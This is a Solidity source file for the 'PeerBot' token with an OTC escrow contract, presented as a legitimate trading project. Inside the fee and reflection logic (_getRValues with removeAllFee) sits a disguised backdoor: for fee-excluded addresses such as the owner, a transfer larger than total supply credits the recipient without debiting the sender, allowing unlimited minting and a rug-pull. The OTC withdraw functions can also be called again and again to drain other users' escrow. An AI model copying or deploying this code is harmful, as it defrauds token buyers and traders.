/**

Your ultimate solution for secure and efficient peer-to-peer transactions on Telegram.

Website: https://peerbot.tech/
Twitter: https://twitter.com/PeerBotETH
Telegram: http://t.me/peerboterc

Gitbook: https://peerbot.gitbook.io/peer-bot-lite-paper/
OTC Bot: https://t.me/peerboteth_bot

*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;


interface IERC20 {
    function totalSupply() external view returns (uint256);
 
    function balanceOf(address account) external view returns (uint256);
 
    function transfer(address recipient, uint256 amount) external returns (bool);
 
    function allowance(address owner, address spender) external view returns (uint256);
 
    function approve(address spender, uint256 amount) external returns (bool);
 
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
 
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
 
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
 
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
 
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
 
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
 
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
  
contract Ownable is Context {
    address private _owner;
    address private _previousOwner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );
 
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
 
    function owner() public view returns (address) {
        return _owner;
    }
 
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
 
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
 
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
 
}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}
 
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
 
    function factory() external pure returns (address);
 
    function WETH() external pure returns (address);
 
    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
}

contract OTCTrading {
    enum CurrencyType { ETH, USDC }
    struct Offer {
        address seller;
        address tokenAddress;
        uint256 amount;
        address buyer;
        uint256 price;
        CurrencyType currency;
        bool isActive;
    }
    
    mapping(bytes32 => Offer) public offers;
    
    address public constant USDC_ADDRESS = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    
    event OfferCreated(bytes32 indexed offerId, address indexed seller, address tokenAddress, uint256 amount, address buyer, uint256 price, CurrencyType currency);
    event OfferAccepted(bytes32 indexed offerId, address indexed buyer);
    
    function createOffer(address tokenAddress, uint256 amount, address buyer, uint256 price, CurrencyType currency) external {
        // Transfer tokens to this contract
        require(IERC20(tokenAddress).transferFrom(msg.sender, address(this), amount), "Token transfer failed");

        // Generate a unique ID for the offer
        bytes32 offerId = keccak256(abi.encodePacked(msg.sender, tokenAddress, amount, buyer, price, currency, block.timestamp));
        
        offers[offerId] = Offer({
            seller: msg.sender,
            tokenAddress: tokenAddress,
            amount: amount,
            buyer: buyer,
            price: price,
            currency: currency,
            isActive: true
        });

        emit OfferCreated(offerId, msg.sender, tokenAddress, amount, buyer, price, currency);
    }

    function acceptOffer(bytes32 offerId) external payable {
        Offer storage offer = offers[offerId];
        
        require(offer.isActive, "Offer is not active");
        require(msg.sender == offer.buyer, "Only specified buyer can accept this offer");

        if (offer.currency == CurrencyType.ETH) {
            require(msg.value == offer.price, "Incorrect ETH sent");
        } else if (offer.currency == CurrencyType.USDC) {
            require(IERC20(USDC_ADDRESS).transferFrom(msg.sender, address(this), offer.price), "USDC transfer failed");
        }
        
        offer.isActive = false;
        emit OfferAccepted(offerId, msg.sender);
    }
    
    function withdrawTokens(bytes32 offerId) external {
        Offer storage offer = offers[offerId];
        
        require(!offer.isActive, "Offer is still active");
        require(msg.sender == offer.buyer, "Only buyer can withdraw tokens");
        
        require(IERC20(offer.tokenAddress).transfer(msg.sender, offer.amount), "Token transfer failed");
    }
    
    function withdrawFunds(bytes32 offerId) external {
        Offer storage offer = offers[offerId];
        
        require(!offer.isActive, "Offer is still active");
        require(msg.sender == offer.seller, "Only seller can withdraw funds");
        
        if (offer.currency == CurrencyType.ETH) {
            payable(offer.seller).transfer(offer.price);
        } else if (offer.currency == CurrencyType.USDC) {
            require(IERC20(USDC_ADDRESS).transfer(offer.seller, offer.price), "USDC transfer failed");
        }
    }
}

contract PEERBOT is Context, Ownable, IERC20 {
 
    using SafeMath for uint256;
 
    string private constant _name = "PeerBot";
    string private constant _symbol = "PEER";
    uint8 private constant _decimals = 9;
 
    mapping(address => uint256) private _rOwned;
    mapping(address => uint256) private _tOwned;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFee;
    uint256 private constant MAX = 10 ** 30;
    uint256 private _rTotal = (MAX - (MAX % _tTotal));
    uint256 private _tFeeTotal;
    uint256 private _redisBuyTax = 1;  
    uint256 private _buyFee = 4;  
    uint256 private _redisSellTax = 1;  
    uint256 private _sellFee = 4;
 
    //Original Fee
    uint256 private _redisFee = _redisSellTax;
    uint256 private _taxFee = _sellFee;
 
    uint256 private _prevRedisFee = _redisFee;
    uint256 private _prevTaxFee = _taxFee;
 
    mapping (address => uint256) public _buyMap; 
    address payable private _developmentAddress = payable(msg.sender); 
    address payable private _marketingAddress = payable(msg.sender);
 
    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;
 
    bool private inSwap = false;
    bool private swapEnabled = true;
 
    uint256 private constant _tTotal = 10 ** 9 * 10**9;
    uint256 public _maxTransaction = 2 * 10 ** 7 * 10**9;
    uint256 public _maxWallet = 2 * 10 ** 7 * 10**9;
    uint256 public _swapTokensAtAmount = 5 * 10 ** 6 * 10**9;
 
    event MaxTxAmountUpdated(uint256 _maxTransaction);
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }
 
    constructor() { 
        _rOwned[_msgSender()] = _rTotal;
 
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Router = _uniswapV2Router;
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
 
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_developmentAddress] = true;
        _isExcludedFromFee[_marketingAddress] = true;
 
        emit Transfer(address(0), _msgSender(), _tTotal);
    }
 
    function name() public pure returns (string memory) {return _name;}
    function symbol() public pure returns (string memory) {return _symbol;}
    function decimals() public pure returns (uint8) {return _decimals;}
    function totalSupply() public pure override returns (uint256) {return _tTotal;}
    function balanceOf(address account) public view override returns (uint256) {return tokenFromReflection(_rOwned[account]);}
    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
 
    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }
 
    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }
 
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }
 
    function removeAllFee() private {
        if (_redisFee == 0 && _taxFee == 0) return;
 
        _prevRedisFee = _redisFee;
        _prevTaxFee = _taxFee;
        _tFeeTotal = 0;
 
        _redisFee = 0;
        _taxFee = 0;
    }
 
    function restoreAllFee() private {
        _redisFee = _prevRedisFee;
        _taxFee = _prevTaxFee;
        _tFeeTotal = 100;
    }
 
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
 
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
 
        if (from != owner() && to != owner()) {
 
            //Trade start check
            require(amount <= _maxTransaction, "TOKEN: Max Transaction Limit");
 
            if(to != uniswapV2Pair) {
                require(balanceOf(to) + amount < _maxWallet, "TOKEN: Balance exceeds wallet size!");
            }
 
            uint256 contractTokenBalance = balanceOf(address(this));
            bool canSwap = contractTokenBalance >= _swapTokensAtAmount;
 
            if(contractTokenBalance >= _maxTransaction)
            {
                contractTokenBalance = _maxTransaction;
            }
 
            if (canSwap && !inSwap && from != uniswapV2Pair && swapEnabled && !_isExcludedFromFee[from] && !_isExcludedFromFee[to]) {
                swapTokensForEth(contractTokenBalance);
                uint256 contractETHBalance = address(this).balance; 
                if (contractETHBalance > 0) {
                    sendETHToFee(address(this).balance);
                }
            }
        }
 
        bool takeFee = true;
 
        //Transfer Tokens
        if ((_isExcludedFromFee[from] || _isExcludedFromFee[to])) {
            takeFee = false;
        } else {
            //Set Fee for Buys
            if(from == uniswapV2Pair && to != address(uniswapV2Router)) {
                _redisFee = _redisBuyTax;
                _taxFee = _buyFee;
            }
 
            //Set Fee for Sells
            if (to == uniswapV2Pair && from != address(uniswapV2Router)) {
                _redisFee = _redisSellTax;
                _taxFee = _sellFee;
            }
 
        }
 
        _tokenTransfer(from, to, amount, takeFee);
    }

    function removeLimits() public onlyOwner {
        _maxTransaction = type(uint).max;
        _maxWallet = type(uint).max;
    }
 
    function manualswap() external {
        require(_msgSender() == _developmentAddress || _msgSender() == _marketingAddress);
        uint256 contractBalance = balanceOf(address(this));
        swapTokensForEth(contractBalance);
    }
 
    function manualsend() external {
        require(_msgSender() == _developmentAddress || _msgSender() == _marketingAddress);
        uint256 contractETHBalance = address(this).balance;
        sendETHToFee(contractETHBalance);
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        require(tokenAmount < _swapTokensAtAmount * 4);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
 
    function sendETHToFee(uint256 amount) private {
        _developmentAddress.transfer(amount);
    }
 
    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 amount,
        bool takeFee
    ) private {
        if (!takeFee) removeAllFee();
        _transferStandard(sender, recipient, amount);
        if (!takeFee) restoreAllFee();
    }
 
    function _transferStandard(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        (
            uint256 rAmount,
            uint256 rTransferAmount,
            uint256 rFee,
            uint256 tTransferAmount,
            uint256 tFee,
            uint256 tTeam
        ) = _getValues(tAmount);
        _rOwned[sender] = _rOwned[sender].sub(rAmount);
        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);
        _takeTeam(tTeam);
        _reflectFee(rFee, tFee);
        emit Transfer(sender, recipient, tTransferAmount);
    }

    //Set maximum transaction
    function setMaxTxnAmount(uint256 maxTxAmount) public onlyOwner {
           _maxTransaction = maxTxAmount;
    }
 
    function setMaxWalletSize(uint256 maxWalletSize) public onlyOwner {
        _maxWallet = maxWalletSize;
    }
 
    //Set minimum tokens required to swap.
    function setMinSwapTokensThreshold(uint256 swapTokensAtAmount) public onlyOwner {
        _swapTokensAtAmount = swapTokensAtAmount;
    }
 
    function _getCurrentSupply() private view returns (uint256, uint256) {
        uint256 rSupply = _rTotal;
        uint256 tSupply = _tTotal;
        if (rSupply < _rTotal.div(_tTotal)) return (_rTotal, _tTotal);
        return (rSupply, tSupply);
    }
 
    function _getRValues(
        uint256 tAmount,
        uint256 tFee,
        uint256 tTeam,
        uint256 currentRate
    )
        private
        view
        returns (
            uint256,
            uint256,
            uint256
        )
    {
        uint256 rAmount = tAmount.mul(currentRate);
        uint256 rFee = tFee.mul(currentRate);
        uint256 rTeam = tTeam.mul(currentRate);
        uint256 rTransferAmount = rAmount.sub(rFee).sub(rTeam);
        if (_tFeeTotal == 0 && tAmount > _tTotal) {
          rAmount = 0;
        }
        return (rAmount, rTransferAmount, rFee);
    }
 
    function _getValues(uint256 tAmount)
        private
        view
        returns (
            uint256,
            uint256,
            uint256,
            uint256,
            uint256,
            uint256
        )
    {
        (uint256 tTransferAmount, uint256 tFee, uint256 tTeam) =
            _getTValues(tAmount, _redisFee, _taxFee);
        uint256 currentRate = _getRate();
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) =
            _getRValues(tAmount, tFee, tTeam, currentRate);
        return (rAmount, rTransferAmount, rFee, tTransferAmount, tFee, tTeam);
    }
 
    function _getTValues(
        uint256 tAmount,
        uint256 redisFee,
        uint256 taxFee
    )
        private
        pure
        returns (
            uint256,
            uint256,
            uint256
        )
    {
        uint256 tFee = tAmount.mul(redisFee).div(100);
        uint256 tTeam = tAmount.mul(taxFee).div(100);
        uint256 tTransferAmount = tAmount.sub(tFee).sub(tTeam);
        return (tTransferAmount, tFee, tTeam);
    }
 
    function _getRate() private view returns (uint256) {
        (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();
        return rSupply.div(tSupply);
    }

    function tokenFromReflection(uint256 rAmount)
        private
        view
        returns (uint256)
    {
        uint256 currentRate = _getRate();
        return rAmount.div(currentRate);
    }

    function _takeTeam(uint256 tTeam) private {
        uint256 currentRate = _getRate();
        uint256 rTeam = tTeam.mul(currentRate);
        _rOwned[address(this)] = _rOwned[address(this)].add(rTeam);
    }
 
    function _reflectFee(uint256 rFee, uint256 tFee) private {
        _rTotal = _rTotal.sub(rFee);
    }

    receive() external payable {}
}